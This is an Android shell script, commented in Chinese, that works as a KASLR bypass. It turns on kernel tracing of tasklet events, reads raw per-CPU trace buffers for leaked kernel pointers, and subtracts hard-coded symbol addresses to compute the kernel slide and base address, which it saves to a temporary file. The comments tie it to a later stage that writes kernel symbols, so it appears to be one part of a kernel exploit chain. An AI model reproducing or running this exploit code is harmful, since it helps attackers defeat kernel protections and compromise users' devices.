#!/system/bin/sh
# KASLR slide 自给：irq/tasklet_entry + per_cpu trace_pipe_raw（纯 shell）
# 用法：sh kaslr_self.sh   → 打印 slide/base，并把 base 写入 /data/local/tmp/kaslr_base
# 说明：Android sh 的算术只有 32 位，故所有 64 位地址按 4x16bit 分段做加减。
# 2026-11-05 修正：PRE1..3 原为 0xffffffc0122?8790（少 0x80000，来自旧符号表），
#   syms_shift.txt 实际值 = 0xffffffc0122c8790 / 0xffffffc0122978c0 / 0xffffffc0122c8798。
#   旧 slide 因此恒偏大 0x80000，导致所有 image 符号写偏 0x80000（a17/a17c 的 BTI key 写空）。
TR=/sys/kernel/tracing
OUT=/data/local/tmp/.kaslr_raw.bin
VALS=/data/local/tmp/.kaslr_vals
CAND=/data/local/tmp/.kaslr_cand
PRE1=ffffffc0122c8790   # peri_dma_tasklet.cfi_jt
PRE2=ffffffc0122978c0   # vchan_complete.cfi_jt
PRE3=ffffffc0122c8798   # pump_transfers.cfi_jt
BASE0=ffffffc010000000  # KIMAGE_TEXT_BASE

seg() { printf '%s' "$1" | cut -c${2}-$(( $2 + 3 )); }

# 16hex - 16hex（4 段 16bit 借位）
hsub() {
  R=""; B=0; i=4
  while [ "$i" -ge 1 ]; do
    p=$(( (i - 1) * 4 + 1 ))
    a=$(seg "$1" $p); b=$(seg "$2" $p)
    d=$(( 0x$a - 0x$b - B ))
    if [ "$d" -lt 0 ]; then d=$(( d + 65536 )); B=1; else B=0; fi
    R=$(printf '%04x' $d)$R
    i=$(( i - 1 ))
  done
  printf '%s\n' "$R"
}

# 16hex + 16hex（4 段 16bit 进位）
hadd() {
  R=""; C=0; i=4
  while [ "$i" -ge 1 ]; do
    p=$(( (i - 1) * 4 + 1 ))
    a=$(seg "$1" $p); b=$(seg "$2" $p)
    s=$(( 0x$a + 0x$b + C ))
    if [ "$s" -ge 65536 ]; then s=$(( s - 65536 )); C=1; else C=0; fi
    R=$(printf '%04x' $s)$R
    i=$(( i - 1 ))
  done
  printf '%s\n' "$R"
}

trim() { t=$(printf '%s' "$1" | sed 's/^0*//'); [ -z "$t" ] && t=0; printf '%s' "$t"; }

echo 0 > "$TR/tracing_on"
echo > "$TR/trace"
echo 1 > "$TR/events/irq/tasklet_entry/enable"
echo 1 > "$TR/tracing_on"          # 不开 tracing_on 则 buffer 永远空 (raw_values=0 的根因)
sleep 1
echo 0 > "$TR/tracing_on"
echo 0 > "$TR/events/irq/tasklet_entry/enable"
echo -n "[kaslr] raw_bytes="
od -An -v "$TR/trace" | wc -l

: > "$OUT"
c=0
while [ "$c" -lt 6 ]; do
  timeout 2 head -c 8192 "$TR/per_cpu/cpu$c/trace_pipe_raw" >> "$OUT" 2>/dev/null
  c=$((c + 1))
done

od -An -tx8 -v "$OUT" | tr -s ' \t' '\n' | grep -E '^ffffff[0-9a-f]{10}$' | sort -u > "$VALS"

: > "$CAND"
while read v; do
  [ -z "$v" ] && continue
  hsub "$v" "$PRE1" >> "$CAND"
  hsub "$v" "$PRE2" >> "$CAND"
  hsub "$v" "$PRE3" >> "$CAND"
done < "$VALS"

TOP=$(grep -E '0000$' "$CAND" | sort | uniq -c | sort -rn | head -1)
N=$(echo "$TOP" | awk '{print $1}')
SLIDE16=$(echo "$TOP" | awk '{print $2}')
echo "[kaslr] raw_values=$(wc -l < "$VALS") hits=$N slide16=$SLIDE16"

if [ -n "$N" ] && [ "$N" -ge 2 ]; then
  SLIDE=$(trim "$SLIDE16")
  BASE=$(trim "$(hadd "$SLIDE16" "$BASE0")")
  echo "[kaslr] slide=0x$SLIDE base=0x$BASE"
  printf '0x%s\n' "$BASE" > /data/local/tmp/kaslr_base
  echo "[kaslr] wrote /data/local/tmp/kaslr_base = $(cat /data/local/tmp/kaslr_base)"
else
  echo "[kaslr] FAIL: consistent hits < 2"
  exit 1
fi
